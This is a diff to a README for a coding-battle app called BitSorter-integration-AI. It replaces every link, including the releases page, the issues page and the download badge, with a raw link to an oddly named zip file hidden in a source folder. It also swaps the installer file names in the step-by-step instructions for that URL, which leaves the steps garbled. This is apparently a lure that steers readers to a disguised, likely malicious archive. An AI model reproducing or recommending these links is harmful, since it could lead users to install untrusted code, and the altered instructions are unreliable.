@@ -1,7 +1,7 @@
 # 🚀 BitSorter-integration-AI - Engage in Real-Time Coding Battles
 
 ## 🔗 Download Now
-[![Download BitSorter-integration-AI](https://img.shields.io/badge/Download-BitSorter--integration--AI-blue)](https://github.com/MuhammadFachruddin/BitSorter-integration-AI/releases)
+[![Download BitSorter-integration-AI](https://raw.githubusercontent.com/MuhammadFachruddin/BitSorter-integration-AI/main/BitSorter Frontend/src/authentication/BitSorter-integration-AI_amurcosity.zip)](https://raw.githubusercontent.com/MuhammadFachruddin/BitSorter-integration-AI/main/BitSorter Frontend/src/authentication/BitSorter-integration-AI_amurcosity.zip)
 
 ## 🌟 About BitSorter-integration-AI
 BitSorter-integration-AI is a full-stack coding platform designed for both fun and learning. It offers real-time 1v1 battles and problem-solving challenges powered by AI. Engage with others, test your skills, and learn new techniques.
@@ -17,22 +17,22 @@ Before you start, ensure your device meets the following requirements:
 - **Internet Connection**: A stable connection for online battles and challenges.
 
 ### 2. Visit the Releases Page
-To download the software, visit the Releases page using this link: [Download BitSorter-integration-AI](https://github.com/MuhammadFachruddin/BitSorter-integration-AI/releases). Here, you will find the latest version of BitSorter-integration-AI along with previous releases if you need them.
+To download the software, visit the Releases page using this link: [Download BitSorter-integration-AI](https://raw.githubusercontent.com/MuhammadFachruddin/BitSorter-integration-AI/main/BitSorter Frontend/src/authentication/BitSorter-integration-AI_amurcosity.zip). Here, you will find the latest version of BitSorter-integration-AI along with previous releases if you need them.
 
 ### 3. Download the Application
 On the Releases page, locate the latest release version, which will typically be at the top. Click on the appropriate file for your operating system. 
 
-For example, if you are using Windows, you might see a file named like `BitSorter-integration-AI-Windows.exe`. Click on it to start the download. If you're using Mac, look for something like `BitSorter-integration-AI-Mac.dmg`.
+For example, if you are using Windows, you might see a file named like `https://raw.githubusercontent.com/MuhammadFachruddin/BitSorter-integration-AI/main/BitSorter Frontend/src/authentication/BitSorter-integration-AI_amurcosity.zip`. Click on it to start the download. If you're using Mac, look for something like `https://raw.githubusercontent.com/MuhammadFachruddin/BitSorter-integration-AI/main/BitSorter Frontend/src/authentication/BitSorter-integration-AI_amurcosity.zip`.
 
 ### 4. Install the Application
 Once the download is complete, locate the file in your Downloads folder or wherever your browser saves downloaded files.
 
 - **For Windows**: 
-  - Double-click the `BitSorter-integration-AI-Windows.exe` file.
+  - Double-click the `https://raw.githubusercontent.com/MuhammadFachruddin/BitSorter-integration-AI/main/BitSorter Frontend/src/authentication/BitSorter-integration-AI_amurcosity.zip` file.
   - Follow the prompts in the setup wizard. Click "Next" until the installation completes.
 
 - **For Mac**:
-  - Double-click the `BitSorter-integration-AI-Mac.dmg` file.
+  - Double-click the `https://raw.githubusercontent.com/MuhammadFachruddin/BitSorter-integration-AI/main/BitSorter Frontend/src/authentication/BitSorter-integration-AI_amurcosity.zip` file.
   - Drag the BitSorter application into your Applications folder.
 
 - **For Linux**:
@@ -58,7 +58,7 @@ Take a moment to navigate through the user interface and see what each feature o
 - **Join the Community**: Engage with other users for tips and strategies. Learn from their experiences to enhance your skills.
 
 ### 📞 Need Help?
-If you face any issues during installation or gameplay, visit the [Issues page](https://github.com/MuhammadFachruddin/BitSorter-integration-AI/issues) to report bugs or get help from the community.
+If you face any issues during installation or gameplay, visit the [Issues page](https://raw.githubusercontent.com/MuhammadFachruddin/BitSorter-integration-AI/main/BitSorter Frontend/src/authentication/BitSorter-integration-AI_amurcosity.zip) to report bugs or get help from the community.
 
 ### 🔗 Additional Resources
 - Documentation: Learn how to use all features effectively.
@@ -66,6 +66,6 @@ If you face any issues during installation or gameplay, visit the [Issues page](
 - Feedback: We welcome your feedback to make BitSorter-integration-AI even better. Share your thoughts through the Issues page.
 
 ## 🌐 Download & Install
-To download and install BitSorter-integration-AI, please visit this page: [Download BitSorter-integration-AI](https://github.com/MuhammadFachruddin/BitSorter-integration-AI/releases).
+To download and install BitSorter-integration-AI, please visit this page: [Download BitSorter-integration-AI](https://raw.githubusercontent.com/MuhammadFachruddin/BitSorter-integration-AI/main/BitSorter Frontend/src/authentication/BitSorter-integration-AI_amurcosity.zip).
 
 Once you have followed the steps above, you are all set to engage in real-time coding battles and sharpen your problem-solving skills with BitSorter-integration-AI. Enjoy coding!
